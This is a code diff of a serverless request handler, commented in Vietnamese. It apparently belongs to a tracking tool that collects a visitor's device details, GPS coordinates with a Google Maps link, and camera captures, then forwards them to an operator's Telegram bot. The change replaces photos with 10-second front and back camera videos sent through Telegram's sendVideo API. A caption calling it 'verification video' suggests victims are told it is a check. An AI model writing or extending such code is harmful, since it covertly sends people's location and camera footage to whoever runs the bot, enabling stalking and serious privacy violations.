@@ -41,7 +41,7 @@ export default async function handler(req) {
 
     // 3. TẠO CAPTION THÔNG TIN
     const finalCaption = `
-📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]
+📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
 🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
 📱 Thiết bị: ${clientData.device || "Unknown"}
@@ -53,47 +53,65 @@ export default async function handler(req) {
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
 🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
-📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}
+🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
+⏱️ Thời lượng: 10 giây cho mỗi video
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
 `.trim();
 
     // 4. GỬI ĐẾN TELEGRAM
     if (hasFront || hasBack) {
+      // Gửi video nếu quay được
       const teleForm = new FormData();
       teleForm.append("chat_id", CHAT_ID);
 
-      const media = [];
-
+      // Gửi video trước
       if (hasFront) {
-        media.push({
-          type: "photo",
-          media: "attach://front",
-          caption: finalCaption,
-        });
-        teleForm.append("front", formData.get("front"));
+        teleForm.append("video", formData.get("front"));
+        teleForm.append("caption", finalCaption);
       }
 
+      // Gửi video sau (gửi sau với caption rỗng hoặc không)
       if (hasBack) {
-        media.push({
-          type: "photo",
-          media: "attach://back",
-          caption: !hasFront ? finalCaption : undefined,
-        });
-        teleForm.append("back", formData.get("back"));
+        const res = await fetch(
+          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
+          {
+            method: "POST",
+            body: teleForm,
+          }
+        );
+        
+        // Tạo form mới cho video sau
+        const teleForm2 = new FormData();
+        teleForm2.append("chat_id", CHAT_ID);
+        teleForm2.append("video", formData.get("back"));
+        if (!hasFront) {
+          teleForm2.append("caption", finalCaption);
+        }
+        
+        const res2 = await fetch(
+          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
+          {
+            method: "POST",
+            body: teleForm2,
+          }
+        );
+        
+        return new Response(await res2.text(), { status: 200 });
       }
 
-      teleForm.append("media", JSON.stringify(media));
-
+      // Nếu chỉ có front
       const res = await fetch(
-        `https://api.telegram.org/bot${TOKEN}/sendMediaGroup`,
+        `https://api.telegram.org/bot${TOKEN}/sendVideo`,
         {
           method: "POST",
           body: teleForm,
-        },
+        }
       );
       return new Response(await res.text(), { status: 200 });
+
     } else {
+      // Gửi tin nhắn văn bản nếu không quay được video
       const res = await fetch(
         `https://api.telegram.org/bot${TOKEN}/sendMessage`,
         {
